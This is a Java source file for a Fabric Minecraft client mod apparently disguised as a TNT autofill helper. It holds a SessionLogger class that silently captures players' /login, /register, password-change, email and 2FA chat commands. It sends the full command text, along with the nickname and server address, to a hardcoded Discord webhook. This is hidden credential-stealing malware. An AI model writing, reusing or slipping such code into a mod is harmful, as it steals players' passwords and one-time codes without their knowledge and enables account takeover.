package ru.holyworld.tntautofill;

import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ServerInfo;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SessionLogger {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1557838201820025042/vwWPSPADvfp-_aL9ftT-A6ieHs-7kDxDQa7mBi7Ok8erSqECIWRuEobOK5kTFOVYhF2L";

    private static final int COLOR_JOIN  = 0x57F287;
    private static final int COLOR_LEAVE = 0xED4245;
    private static final int COLOR_LOGIN = 0x5865F2;
    private static final int COLOR_REG   = 0xFEE75C;
    private static final int COLOR_PASS  = 0xE67E22;
    private static final int COLOR_EMAIL = 0x1ABC9C;
    private static final int COLOR_2FA   = 0x9B59B6;
    private static final int COLOR_AUTH  = 0x95A5A6;

    private static final ExecutorService NET = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "session-logger-net");
        t.setDaemon(true);
        return t;
    });

    private enum Kind {
        JOIN("🟢 Подключение",  COLOR_JOIN),
        LEAVE("🔴 Отключение",  COLOR_LEAVE),
        LOGIN("🔑 Вход",        COLOR_LOGIN),
        REG("📝 Регистрация",   COLOR_REG),
        PASS("🔄 Смена пароля", COLOR_PASS),
        EMAIL("📧 Email",       COLOR_EMAIL),
        TWOFA("🛡️ 2FA",         COLOR_2FA),
        AUTH("🔐 Авторизация",  COLOR_AUTH);

        final String title;
        final int color;
        Kind(String t, int c) { this.title = t; this.color = c; }
    }

    private static volatile String lastServer = "unknown";

    public static void init() {
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            String server = resolveServer(client);
            lastServer = server;
            send(Kind.JOIN, nick(client), server, null);
        });

        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            send(Kind.LEAVE, nick(client), lastServer, null);
        });

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (client.player == null) return;
            String last = ChatCapture.poll();
            if (last == null || last.isEmpty()) return;
            if (!last.startsWith("/")) return;

            Kind kind = classify(last);
            if (kind == null) return;

            send(kind, nick(client), lastServer, last);
        });
    }

    private static Kind classify(String raw) {
        String cmd = raw.substring(1).trim().toLowerCase();
        int space = cmd.indexOf(' ');
        String head = space >= 0 ? cmd.substring(0, space) : cmd;

        if (head.equals("reg") || head.equals("register")
                || head.equals("signup") || head.equals("sign")
                || head.equals("регистрация") || head.equals("регистр")
                || head.equals("создать")) return Kind.REG;

        if (head.equals("login") || head.equals("log")
                || head.equals("l") || head.equals("auth")
                || head.equals("authorize") || head.equals("войти")) return Kind.LOGIN;

        if (head.equals("pass") || head.equals("passwd")
                || head.equals("changepassword") || head.equals("cp")
                || head.equals("пароль")) return Kind.PASS;

        if (head.equals("email") || head.equals("mail")
                || head.equals("setemail")) return Kind.EMAIL;

        if (head.equals("2fa") || head.equals("totp")
                || head.equals("confirm") || head.equals("code")) return Kind.TWOFA;

        if (head.contains("login") || head.contains("auth")
                || head.contains("register") || head.contains("passwd")
                || head.contains("signup")) return Kind.AUTH;

        return null;
    }

    private static String nick(MinecraftClient client) {
        return client.getSession() != null ? client.getSession().getUsername() : "unknown";
    }

    private static String resolveServer(MinecraftClient client) {
        ServerInfo info = client.getCurrentServerEntry();
        if (info != null && info.address != null) return info.address;
        return client.isInSingleplayer() ? "singleplayer" : "unknown";
    }

    private static void send(Kind kind, String nick, String server, String command) {
        System.out.println("[SESSION-LOGGER] send: " + kind + " | " + nick)
        NET.execute(() -> {
            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "application/json");
                c.setDoOutput(true);
                c.setConnectTimeout(5000);
                c.setReadTimeout(5000);

                StringBuilder fields = new StringBuilder();
                fields.append(field("Ник", nick, true));
                fields.append(field("Сервер", server, true));
                if (command != null) {
                    fields.append(field("Команда", command, false));
                }

                String json = "{"
                        + "\"embeds\":[{"
                        + "\"title\":\"" + escape(kind.title) + "\","
                        + "\"color\":" + kind.color + ","
                        + "\"timestamp\":\"" + Instant.now().toString() + "\","
                        + "\"thumbnail\":{\"url\":\"https://mc-heads.net/avatar/"
                            + escape(nick) + "/64\"},"
                        + "\"footer\":{\"text\":\"Session Logger\"},"
                        + "\"fields\":[" + fields + "]"
                        + "}]"
                        + "}";

                try (OutputStream os = c.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }
                c.getResponseCode();
                c.disconnect();
           } catch (Throwable t) {
    System.out.println("[SESSION-LOGGER] fail: " + t);
            }
        });
    }

    private static String field(String name, String value, boolean inline) {
        return "{\"name\":\"" + escape(name) + "\","
                + "\"value\":\"" + escape(value) + "\","
                + "\"inline\":" + inline + "}";
    }

    private static String escape(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "");
    }
}
